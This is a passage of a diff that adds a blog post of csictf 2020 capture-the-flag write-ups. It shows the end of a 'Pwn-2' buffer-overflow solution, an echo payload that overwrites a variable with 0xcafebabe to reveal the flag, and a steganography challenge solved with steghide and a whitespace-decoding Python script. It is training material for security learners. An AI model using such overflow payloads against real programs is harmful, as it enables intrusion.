class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Payload:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">microbial:tmp none$ <span class="built_in">echo</span> -n -e <span class="string">"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xbe\xba\xfe\xca"</span> | ./pwn-2</span><br><span class="line">Welcome to csictf! Where are you headed?</span><br><span class="line">Safe Journey!</span><br><span class="line">You<span class="string">'ve reached your destination, here'</span>s a flag!</span><br><span class="line">csictf&#123;c4n_y0u_re4lly_telep0rt?&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Flag: <code>csictf{c4n_y0u_re4lly_telep0rt?}</code></p>
+<h2 id="Unseen"><a href="#Unseen" class="headerlink" title="Unseen"></a>Unseen</h2><p>With his dying breath, Prof. Ter Stegen hands us an image and a recording. He tells us that the image is least significant, but is a numerical key to the recording and the recording hides the answer. It may seem as though it’s all for nothing, but trust me it’s not.</p>
+<p>* I did not solve this in time but wanted to put this here as a reminder.  I knew everything needed to solve this problem but failed to put the pieces together in time. The official writeup is at <a href="https://github.com/csivitu/ctf-challenges/tree/master/forensics/unseen" target="_blank" rel="noopener">https://github.com/csivitu/ctf-challenges/tree/master/forensics/unseen</a></p>
+<p>This problem provides a moris.wav and nyc.png file.</p>
+<p>using <code>stegsolve</code> I was able to extract the key from the image.</p>
+<img src="/2020/07/19/csictf/nyc.png" class="">
+<img src="/2020/07/19/csictf/solved.bmp" class="">
+
+<p>key: <code>42845193</code></p>
+<p>The audio file is morse code. Using <code>https://morsecode.world/international/decoder/audio-decoder-adaptive.html</code> I got the read out as <code>SEARCH-SOMEWHERE-ELSE</code>.  This message is both helpful and not (?).</p>
+<p>The visual form of the message is:<br><code>... . .- .-. -.-. .... -....- ... --- -- . .-- .... . .-. . -....- . .-.. ... .</code><br><code>111 1 10 101 0101 1111 011110 111 000 00 1 100 1111 1 101 1 011110 1 1011 111 1</code></p>
+<p>Next run <code>steghide</code> against moris.wav and use the password ‘42845193’</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">microbial:tmp none$ steghide extract -sf /root/unseen/morse.wav</span><br><span class="line">Enter passphrase:</span><br><span class="line">wrote extracted data to <span class="string">"flag.txt"</span>.</span><br></pre></td></tr></table></figure>
+
+<p>The flag file looks empty but looking at it in hex we can see it’s filled with tabs and spaces.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">microbial:tmp none$ xxd flag.txt | head</span><br><span class="line">00000000: 2020 2009 0920 2020 0909 0d0a 090d 0a20     ..   .......</span><br><span class="line">00000010: 2020 2020 0909 0920 2009 090d 0a09 0d0a      ...  .......</span><br><span class="line">00000020: 2020 2020 2009 0920 0920 2009 0d0a 090d       .. .  .....</span><br><span class="line">00000030: 0a20 2020 2020 0909 2020 2009 090d 0a09  .     ..   .....</span><br><span class="line">00000040: 0d0a 2020 2020 2009 0909 2009 2020 0d0a  ..     ... .  ..</span><br><span class="line">00000050: 090d 0a20 2020 2020 0909 2020 0909 200d  ...     ..  .. .</span><br><span class="line">00000060: 0a09 0d0a 2020 2020 2009 0909 0920 0909  ....     .... ..</span><br><span class="line">00000070: 0d0a 090d 0a20 2020 2020 2009 0920 0909  .....      .. ..</span><br><span class="line">00000080: 090d 0a09 0d0a 2020 2020 2009 0920 0920  ......     .. .</span><br><span class="line">00000090: 2020 0d0a 090d 0a20 2020 2020 2009 0920    .....      ..</span><br></pre></td></tr></table></figure>
+
+<p>The flag.txt file can be decoded with the following script</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'tmp/flag.txt'</span>, <span class="string">'rb'</span>).read()</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">32</span>: <span class="comment"># sp</span></span><br><span class="line">        flag += <span class="string">"0"</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="number">9</span>: <span class="comment"># ht</span></span><br><span class="line">        flag += <span class="string">"1"</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="number">10</span>: <span class="comment"># nl</span></span><br><span class="line">        flag += <span class="string">"\n"</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="number">13</span>: <span class="comment"># cr</span></span><br><span class="line">        flag += <span class="string">''</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"### There is something else ###"</span>)  </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag.split(<span class="string">'\n'</span>):</span><br><span class="line">    print(chr(int(i, <span class="number">2</span>)), end=<span class="string">''</span>)</span><br><span class="line">print(<span class="string">""</span>)</span><br></pre></td></tr></table></figure>
+
+<p>Flag: <code>csictf{7h47_15_h0w_y0u_c4n_83c0m3_1nv151813}</code></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#AKA"><span class="toc-number">1.</span> <span class="toc-text">AKA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Rivest-Shamir-Adleman"><span class="toc-number">2.</span> <span class="toc-text">Rivest Shamir Adleman</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Gradient-sky"><span class="toc-number">3.</span> <span class="toc-text">Gradient sky</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Archenemy"><span class="toc-number">4.</span> <span class="toc-text">Archenemy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Panda"><span class="toc-number">5.</span> <span class="toc-text">Panda</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cascade"><span class="toc-number">6.</span> <span class="toc-text">Cascade</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn-2"><span class="toc-number">7.</span> <span class="toc-text">Pwn-2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Unseen"><span class="toc-number">8.</span> <span class="toc-text">Unseen</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/07/19/csictf/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/07/19/csictf/&text=csictf" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/07/19/csictf/&title=csictf" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/07/19/csictf/&is_video=false&description=csictf" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=csictf&body=Check out this article: http://yoursite.com/2020/07/19/csictf/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/07/19/csictf/&title=csictf" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/07/19/csictf/&title=csictf" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/07/19/csictf/&title=csictf" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/07/19/csictf/&title=csictf" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/07/19/csictf/&name=csictf&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2020/07/19/csictf/&t=csictf" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020
+    Brian Bashor
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
